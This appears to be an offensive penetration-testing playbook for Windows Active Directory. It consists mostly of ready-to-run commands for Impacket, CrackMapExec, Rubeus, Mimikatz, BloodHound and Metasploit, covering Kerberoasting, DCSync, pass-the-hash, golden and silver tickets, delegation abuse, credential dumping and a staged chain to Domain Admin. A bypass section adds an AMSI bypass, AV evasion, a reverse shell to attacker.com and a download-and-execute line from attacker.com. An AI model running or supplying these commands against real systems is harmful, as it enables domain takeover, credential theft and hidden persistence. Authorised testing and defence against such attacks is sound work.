# Windows Active Directory Playbook

## Indicators

Signs this vulnerability may be present:
- Domain-joined Windows systems (computer names like `WS01.corp.local`)
- Kerberos authentication in use (port 88)
- LDAP/LDAPS services (ports 389/636)
- SMB file shares requiring domain credentials
- Group Policy Objects (GPO) in use
- DNS pointing to domain controllers
- Service Principal Names (SPNs) registered in AD
- NTLM authentication fallback enabled
- Users with password-based Kerberos pre-authentication

## Tools

### Impacket Suite

```bash
# GetUserSPNs - Kerberoasting
impacket-GetUserSPNs domain.local/user:password -dc-ip 192.168.1.1 -request
impacket-GetUserSPNs domain.local/user:password -dc-ip 192.168.1.1 -request -outputfile hashes.txt

# GetNPUsers - AS-REP Roasting
impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip 192.168.1.1 -format hashcat
impacket-GetNPUsers domain.local/user:password -dc-ip 192.168.1.1 -request

# secretsdump - DCSync and credential extraction
impacket-secretsdump domain.local/admin:password@192.168.1.1
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
impacket-secretsdump domain.local/admin@192.168.1.1 -hashes :NTLMHASH
impacket-secretsdump -just-dc domain.local/admin:password@dc01.domain.local

# getTGT - Request TGT
impacket-getTGT domain.local/user:password -dc-ip 192.168.1.1
impacket-getTGT domain.local/user -hashes :NTLMHASH -dc-ip 192.168.1.1

# getST - Request service ticket
impacket-getST domain.local/user:password -spn cifs/server.domain.local -dc-ip 192.168.1.1
impacket-getST domain.local/user:password -spn cifs/server.domain.local -impersonate administrator

# psexec - Remote command execution
impacket-psexec domain.local/admin:password@192.168.1.10
impacket-psexec domain.local/admin@192.168.1.10 -hashes :NTLMHASH
impacket-psexec -k -no-pass domain.local/admin@server.domain.local

# wmiexec - WMI-based execution
impacket-wmiexec domain.local/admin:password@192.168.1.10
impacket-wmiexec domain.local/admin@192.168.1.10 -hashes :NTLMHASH

# smbexec - SMB-based execution
impacket-smbexec domain.local/admin:password@192.168.1.10

# atexec - Task scheduler execution
impacket-atexec domain.local/admin:password@192.168.1.10 "whoami"

# dcomexec - DCOM-based execution
impacket-dcomexec domain.local/admin:password@192.168.1.10

# smbclient - SMB file operations
impacket-smbclient domain.local/user:password@192.168.1.10

# lookupsid - SID enumeration
impacket-lookupsid domain.local/user:password@192.168.1.1

# findDelegation - Find delegation
impacket-findDelegation domain.local/user:password -dc-ip 192.168.1.1

# rbcd - Resource-based constrained delegation
impacket-rbcd domain.local/user:password -delegate-to target$ -delegate-from attacker$ -action write -dc-ip 192.168.1.1

# ticketer - Create tickets (Golden/Silver)
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local administrator
impacket-ticketer -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/server.domain.local administrator
```

### CrackMapExec (NetExec)

```bash
# SMB enumeration
crackmapexec smb 192.168.1.0/24
crackmapexec smb 192.168.1.10 -u user -p password --shares
crackmapexec smb 192.168.1.10 -u user -p password --users
crackmapexec smb 192.168.1.10 -u user -p password --groups
crackmapexec smb 192.168.1.10 -u user -p password --pass-pol

# Password spraying
crackmapexec smb 192.168.1.10 -u users.txt -p 'Password123!' --continue-on-success
crackmapexec smb 192.168.1.10 -u users.txt -p passwords.txt --no-bruteforce

# Hash spraying
crackmapexec smb 192.168.1.10 -u users.txt -H hashes.txt

# Command execution
crackmapexec smb 192.168.1.10 -u admin -p password -x "whoami"
crackmapexec smb 192.168.1.10 -u admin -p password -X "Get-Process"

# Credential dumping
crackmapexec smb 192.168.1.10 -u admin -p password --sam
crackmapexec smb 192.168.1.10 -u admin -p password --lsa
crackmapexec smb 192.168.1.10 -u admin -p password --ntds

# LDAP enumeration
crackmapexec ldap 192.168.1.1 -u user -p password --users
crackmapexec ldap 192.168.1.1 -u user -p password --groups
crackmapexec ldap 192.168.1.1 -u user -p password --asreproast output.txt
crackmapexec ldap 192.168.1.1 -u user -p password --kerberoasting output.txt

# WinRM access
crackmapexec winrm 192.168.1.10 -u admin -p password
crackmapexec winrm 192.168.1.10 -u admin -p password -x "whoami"
```

### Rubeus

```powershell
# Kerberoasting
Rubeus.exe kerberoast /outfile:hashes.txt
Rubeus.exe kerberoast /user:sqlservice /outfile:hashes.txt
Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.txt

# AS-REP Roasting
Rubeus.exe asreproast /outfile:asrep.txt
Rubeus.exe asreproast /user:target /outfile:asrep.txt

# Request TGT
Rubeus.exe asktgt /user:user /password:password /enctype:aes256
Rubeus.exe asktgt /user:user /rc4:NTLMHASH
Rubeus.exe asktgt /user:user /aes256:AESHASH

# Request TGS
Rubeus.exe asktgs /ticket:ticket.kirbi /service:cifs/server.domain.local
Rubeus.exe asktgs /ticket:ticket.kirbi /service:cifs/server.domain.local /ptt

# Pass-the-Ticket
Rubeus.exe ptt /ticket:ticket.kirbi
Rubeus.exe ptt /ticket:base64ticket

# S4U (constrained delegation abuse)
Rubeus.exe s4u /user:sqlservice /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/server.domain.local /ptt
Rubeus.exe s4u /ticket:ticket.kirbi /impersonateuser:administrator /msdsspn:cifs/server.domain.local /altservice:http /ptt

# Harvest tickets
Rubeus.exe harvest /interval:30

# Dump tickets
Rubeus.exe dump
Rubeus.exe dump /luid:0x123456
Rubeus.exe dump /service:krbtgt

# Monitor for new tickets
Rubeus.exe monitor /interval:5

# Renew tickets
Rubeus.exe renew /ticket:ticket.kirbi

# Golden ticket
Rubeus.exe golden /rc4:KRBTGT_HASH /domain:domain.local /sid:S-1-5-21-... /user:administrator

# Diamond ticket (more stealthy)
Rubeus.exe diamond /krbkey:KRBTGT_AES256 /tgtdeleg /ticketuser:administrator /ticketuserid:500 /groups:512
```

### Mimikatz

```powershell
# Enable debug privilege
privilege::debug

# Dump credentials from LSASS
sekurlsa::logonpasswords
sekurlsa::wdigest
sekurlsa::kerberos
sekurlsa::msv

# Dump SAM database
lsadump::sam
lsadump::sam /system:SYSTEM /sam:SAM

# DCSync attack
lsadump::dcsync /domain:domain.local /user:krbtgt
lsadump::dcsync /domain:domain.local /all /csv

# Pass-the-Hash
sekurlsa::pth /user:admin /domain:domain.local /ntlm:HASH /run:cmd.exe

# Pass-the-Ticket
kerberos::ptt ticket.kirbi

# Golden Ticket
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /aes256:HASH /ptt

# Silver Ticket
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt

# Export tickets
sekurlsa::tickets /export

# Dump DPAPI
dpapi::masterkey /in:masterkey /password:password
dpapi::cred /in:credential

# Skeleton key (persist backdoor)
misc::skeleton

# Trust keys
lsadump::trust /patch
```

### BloodHound

```bash
# Data collection with SharpHound
SharpHound.exe -c All
SharpHound.exe -c All --ldapusername user --ldappassword password
SharpHound.exe -c All -d domain.local --domaincontroller dc01.domain.local
SharpHound.exe -c All --stealth  # Stealth mode

# Python collector (from Linux)
bloodhound-python -u user -p password -d domain.local -ns 192.168.1.1 -c All
bloodhound-python -u user -p password -d domain.local -c DCOnly  # DC only

# Import data to Neo4j
# Start neo4j: sudo neo4j start
# Start BloodHound GUI, upload zip files

# Key queries in BloodHound:
# - "Find all Domain Admins"
# - "Find Shortest Paths to Domain Admins"
# - "Find Principals with DCSync Rights"
# - "Find Computers with Unconstrained Delegation"
# - "Find Shortest Paths to High Value Targets"
# - "Find Kerberoastable Users with High Privileges"
# - "Find AS-REP Roastable Users"
```

### Metasploit AD Modules

```bash
# Kerberos enumeration
use auxiliary/gather/kerberos_enumusers
set RHOSTS dc01.domain.local
set DOMAIN domain.local
set USER_FILE users.txt
run

# Kerberoasting
use auxiliary/gather/get_user_spns
set RHOSTS dc01.domain.local
set SMBDomain domain.local
set SMBUser user
set SMBPass password
run

# AS-REP roasting
use auxiliary/gather/get_user_spns
set GET_ASREP true
set USER_FILE users.txt
run

# SMB login scanner
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.0/24
set SMBDomain domain.local
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# psexec
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.10
set SMBDomain domain.local
set SMBUser admin
set SMBPass password
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST attacker.com
run

# WMI exec
use exploit/windows/local/wmi_exec
set SESSION 1
set COMMAND whoami
run

# Kiwi (Mimikatz in Meterpreter)
load kiwi
creds_all
creds_msv
creds_kerberos
creds_wdigest
lsa_dump_sam
lsa_dump_secrets
dcsync domain.local krbtgt
golden_ticket_create -d domain.local -s S-1-5-21-... -k KRBTGT_HASH -u administrator -t /tmp/golden.tck
kerberos_ticket_use /tmp/golden.tck

# Hash dump
use post/windows/gather/hashdump
set SESSION 1
run

use post/windows/gather/smart_hashdump
set SESSION 1
set GETSYSTEM true
run

# Domain enumeration
use post/windows/gather/enum_domain
set SESSION 1
run

use post/windows/gather/enum_domain_users
set SESSION 1
run

use post/windows/gather/enum_domain_group_users
set SESSION 1
set GROUP "Domain Admins"
run
```

## Techniques

### 1. Kerberoasting

Extract service ticket hashes for offline cracking.

```bash
# With Impacket (from Linux)
impacket-GetUserSPNs domain.local/user:password -dc-ip 192.168.1.1 -request

# Output contains TGS hashes in hashcat/john format
# Save to file and crack

# With CrackMapExec
crackmapexec ldap 192.168.1.1 -u user -p password --kerberoasting output.txt

# Crack with hashcat (mode 13100 for TGS-REP etype 23)
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule

# Crack with john
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt

# Targeted Kerberoasting (specific user)
impacket-GetUserSPNs domain.local/user:password -dc-ip 192.168.1.1 -request-user sqlservice

# Find users with SPNs via LDAP
ldapsearch -H ldap://192.168.1.1 -D "user@domain.local" -w password \
  -b "DC=domain,DC=local" "(&(samAccountType=805306368)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName
```

### 2. AS-REP Roasting

Target users without Kerberos pre-authentication.

```bash
# With Impacket (from Linux)
# With user list
impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip 192.168.1.1 -format hashcat -outputfile asrep.txt

# With valid credentials (enumerate vulnerable users)
impacket-GetNPUsers domain.local/user:password -dc-ip 192.168.1.1 -request

# With CrackMapExec
crackmapexec ldap 192.168.1.1 -u user -p password --asreproast output.txt

# Crack with hashcat (mode 18200)
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# Find users without pre-auth via LDAP
ldapsearch -H ldap://192.168.1.1 -D "user@domain.local" -w password \
  -b "DC=domain,DC=local" "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName
```

### 3. DCSync Attack

Replicate domain controller data to extract credentials.

```bash
# With Impacket (requires replication rights)
impacket-secretsdump domain.local/admin:password@dc01.domain.local -just-dc
impacket-secretsdump domain.local/admin:password@dc01.domain.local -just-dc-user krbtgt

# Extract specific user hash
impacket-secretsdump domain.local/admin:password@dc01.domain.local -just-dc-user administrator

# With hashes instead of password
impacket-secretsdump domain.local/admin@dc01.domain.local -hashes :NTLMHASH -just-dc

# Check who has DCSync rights
# In BloodHound: "Find Principals with DCSync Rights"

# Via LDAP (check replication permissions)
ldapsearch -H ldap://192.168.1.1 -D "admin@domain.local" -w password \
  -b "DC=domain,DC=local" "(objectClass=*)" nTSecurityDescriptor -s base
```

### 4. Pass-the-Hash (PTH)

```bash
# With Impacket psexec
impacket-psexec domain.local/administrator@192.168.1.10 -hashes :32ed87bdb5fdc5e9cba88547376818d4

# With Impacket wmiexec
impacket-wmiexec domain.local/administrator@192.168.1.10 -hashes :32ed87bdb5fdc5e9cba88547376818d4

# With Impacket smbexec
impacket-smbexec domain.local/administrator@192.168.1.10 -hashes :32ed87bdb5fdc5e9cba88547376818d4

# With CrackMapExec
crackmapexec smb 192.168.1.10 -u administrator -H 32ed87bdb5fdc5e9cba88547376818d4 -x "whoami"

# With evil-winrm
evil-winrm -i 192.168.1.10 -u administrator -H 32ed87bdb5fdc5e9cba88547376818d4

# With xfreerdp (RDP with hash)
xfreerdp /v:192.168.1.10 /u:administrator /pth:32ed87bdb5fdc5e9cba88547376818d4
```

### 5. Pass-the-Ticket (PTT)

```bash
# Export tickets with Mimikatz
sekurlsa::tickets /export

# Convert ticket format (ccache to kirbi and vice versa)
impacket-ticketConverter ticket.kirbi ticket.ccache
impacket-ticketConverter ticket.ccache ticket.kirbi

# Use ticket with Impacket
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass domain.local/administrator@server.domain.local
impacket-wmiexec -k -no-pass domain.local/administrator@server.domain.local

# Verify ticket
klist

# Inject ticket with Rubeus
Rubeus.exe ptt /ticket:base64_ticket_here
Rubeus.exe ptt /ticket:ticket.kirbi
```

### 6. Golden Ticket

Forge TGT with KRBTGT hash for persistent domain access.

```bash
# First, get KRBTGT hash via DCSync
impacket-secretsdump domain.local/admin:password@dc01.domain.local -just-dc-user krbtgt

# Get domain SID
impacket-lookupsid domain.local/user:password@dc01.domain.local 0

# Create golden ticket with Impacket
impacket-ticketer -nthash KRBTGT_NTLM_HASH -domain-sid S-1-5-21-... -domain domain.local administrator
# Creates administrator.ccache

# Use the ticket
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass domain.local/administrator@dc01.domain.local

# Create golden ticket with Mimikatz
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt

# Create golden ticket with Rubeus
Rubeus.exe golden /rc4:KRBTGT_HASH /domain:domain.local /sid:S-1-5-21-... /user:administrator /ptt

# AES256 golden ticket (more stealthy)
impacket-ticketer -aesKey KRBTGT_AES256_HASH -domain-sid S-1-5-21-... -domain domain.local administrator
```

### 7. Silver Ticket

Forge TGS for specific service access.

```bash
# Need: service account NTLM hash, domain SID, target SPN

# Get service account hash
impacket-secretsdump domain.local/admin:password@dc01.domain.local -just-dc-user sqlservice$

# Create silver ticket with Impacket
impacket-ticketer -nthash SERVICE_NTLM_HASH -domain-sid S-1-5-21-... -domain domain.local -spn MSSQL/sql.domain.local administrator

# Create silver ticket with Mimikatz
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /target:sql.domain.local /service:MSSQL /rc4:SERVICE_HASH /ptt

# Common services for silver tickets:
# CIFS - file share access
# HTTP - web applications
# MSSQL - SQL Server
# HOST - scheduled tasks
# LDAP - AD operations
# WSMAN - WinRM
```

### 8. Delegation Attacks

#### Unconstrained Delegation

```bash
# Find computers with unconstrained delegation
crackmapexec ldap dc01.domain.local -u user -p password -M find-delegation

# Via LDAP
ldapsearch -H ldap://192.168.1.1 -D "user@domain.local" -w password \
  -b "DC=domain,DC=local" "(userAccountControl:1.2.840.113556.1.4.803:=524288)" \
  sAMAccountName

# Monitor for tickets on compromised system
Rubeus.exe monitor /interval:5 /filteruser:DC01$

# Trigger authentication (PrinterBug/SpoolSample)
SpoolSample.exe dc01.domain.local webserver.domain.local
# or
printerbug.py domain.local/user:password@dc01.domain.local webserver.domain.local

# Captured TGT can be used for DCSync
```

#### Constrained Delegation

```bash
# Find users/computers with constrained delegation
ldapsearch -H ldap://192.168.1.1 -D "user@domain.local" -w password \
  -b "DC=domain,DC=local" "(msDS-AllowedToDelegateTo=*)" \
  sAMAccountName msDS-AllowedToDelegateTo

# S4U2Self + S4U2Proxy attack
# Get TGT for service account
impacket-getTGT domain.local/sqlservice:password -dc-ip 192.168.1.1

# Use S4U to impersonate user
export KRB5CCNAME=sqlservice.ccache
impacket-getST domain.local/sqlservice:password -spn cifs/server.domain.local -impersonate administrator -dc-ip 192.168.1.1

# Use resulting ticket
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass domain.local/administrator@server.domain.local

# With Rubeus
Rubeus.exe s4u /user:sqlservice /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/server.domain.local /ptt
```

#### Resource-Based Constrained Delegation (RBCD)

```bash
# Requirements: Write access to target computer's msDS-AllowedToActOnBehalfOfOtherIdentity

# Check if we have GenericWrite on target
# Use BloodHound to identify

# Create machine account (if MachineAccountQuota > 0)
impacket-addcomputer domain.local/user:password -computer-name FAKEPC$ -computer-pass FakeP@ss123 -dc-ip 192.168.1.1

# Configure RBCD
impacket-rbcd domain.local/user:password -delegate-to TARGET$ -delegate-from FAKEPC$ -action write -dc-ip 192.168.1.1

# Get service ticket
impacket-getST domain.local/FAKEPC$:FakeP@ss123 -spn cifs/target.domain.local -impersonate administrator -dc-ip 192.168.1.1

# Use ticket
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass domain.local/administrator@target.domain.local
```

### 9. LAPS Enumeration

```bash
# Read LAPS passwords if authorized
crackmapexec ldap dc01.domain.local -u user -p password -M laps

# With ldapsearch
ldapsearch -H ldap://192.168.1.1 -D "user@domain.local" -w password \
  -b "DC=domain,DC=local" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd ms-Mcs-AdmPwdExpirationTime

# PowerShell (on Windows)
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Where-Object {$_.'ms-Mcs-AdmPwd' -ne $null} | Select-Object Name, ms-Mcs-AdmPwd

# With LAPSToolkit
Get-LAPSComputers
Find-LAPSDelegatedGroups
Get-LAPSADmPwdReader -Identity "ws01.domain.local"
```

### 10. Credential Harvesting

```bash
# Dump LSASS remotely
crackmapexec smb 192.168.1.10 -u admin -p password --lsa
crackmapexec smb 192.168.1.10 -u admin -p password -M lsassy

# Dump SAM
crackmapexec smb 192.168.1.10 -u admin -p password --sam

# Dump NTDS.dit
crackmapexec smb dc01.domain.local -u admin -p password --ntds

# Via secretsdump
impacket-secretsdump domain.local/admin:password@192.168.1.10
impacket-secretsdump domain.local/admin:password@dc01.domain.local

# Volume shadow copy for offline extraction
# Create shadow copy
vssadmin create shadow /for=C:
# Copy NTDS.dit and SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system

# Parse offline
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

### 11. Attack Chain: Initial Access to Domain Admin

```bash
# Phase 1: Initial foothold
# Compromise domain user via phishing, password spray, etc.

# Phase 2: Enumerate domain
bloodhound-python -u user -p password -d domain.local -ns 192.168.1.1 -c All

# Phase 3: Identify attack paths
# Analyze BloodHound for shortest path to Domain Admins

# Phase 4: Kerberoast high-value accounts
impacket-GetUserSPNs domain.local/user:password -dc-ip 192.168.1.1 -request
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

# Phase 5: Lateral movement
# Use cracked credentials or PTH
crackmapexec smb 192.168.1.0/24 -u admin -p password

# Phase 6: Privilege escalation
# Target systems where Domain Admins are logged in
# Dump credentials from LSASS
crackmapexec smb server.domain.local -u admin -p password -M lsassy

# Phase 7: Domain dominance
# DCSync to get all hashes
impacket-secretsdump domain.local/domainadmin:password@dc01.domain.local -just-dc

# Phase 8: Persistence
# Golden ticket
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local administrator
```

## Bypass Techniques

### AMSI Bypass

```powershell
# PowerShell AMSI bypass (obfuscate in real use)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Memory patching
$a = [Ref].Assembly.GetTypes() | ? {$_.Name -like "*iUtils"}
$a | % { $_.GetFields('NonPublic,Static') | ? { $_.Name -like "*Failed" } | % { $_.SetValue($null,$true) }}

# In-memory execution
IEX (New-Object Net.WebClient).DownloadString('https://attacker.com/script.ps1')
```

### Defender/AV Evasion

```bash
# Use Impacket from Linux (doesn't trigger Windows AV)

# Obfuscate tools
# Invoke-Obfuscation for PowerShell
# Donut for shellcode conversion

# Living off the land
# Use built-in Windows tools when possible
wmic /node:192.168.1.10 process call create "powershell -enc BASE64"
schtasks /create /tn "Update" /tr "powershell -enc BASE64" /sc once /st 00:00 /s 192.168.1.10 /u admin /p password
```

### Kerberos Encryption Downgrade

```bash
# Request RC4 tickets (more crackable) instead of AES
# Specify encryption type in ticket request
impacket-getTGT domain.local/user:password -dc-ip 192.168.1.1

# Rubeus with specific etype
Rubeus.exe kerberoast /rc4opsec
```

### Protected Users Bypass

```bash
# Protected Users group prevents:
# - NTLM authentication
# - DES/RC4 Kerberos
# - Unconstrained delegation
# - Credential caching

# If target is in Protected Users:
# - Need AES Kerberos tickets
# - Cannot use PTH, need actual password or AES keys
# - Use DCSync for AES keys
```

## Success Indicators

- Service ticket hashes obtained and cracked (Kerberoasting)
- AS-REP hashes obtained and cracked (AS-REP Roasting)
- DCSync successful - NTDS.dit hashes extracted
- Pass-the-Hash provides access to target system
- Golden ticket provides domain-wide access
- Silver ticket provides service-specific access
- Constrained delegation abuse yields privileged ticket
- RBCD attack grants access to target computer
- LAPS passwords retrieved for local admin access
- Domain Admin credentials obtained
- Lateral movement to multiple systems successful
- Persistent access established via golden ticket
- BloodHound reveals attack paths to high-value targets
- Credential dump reveals cached domain credentials
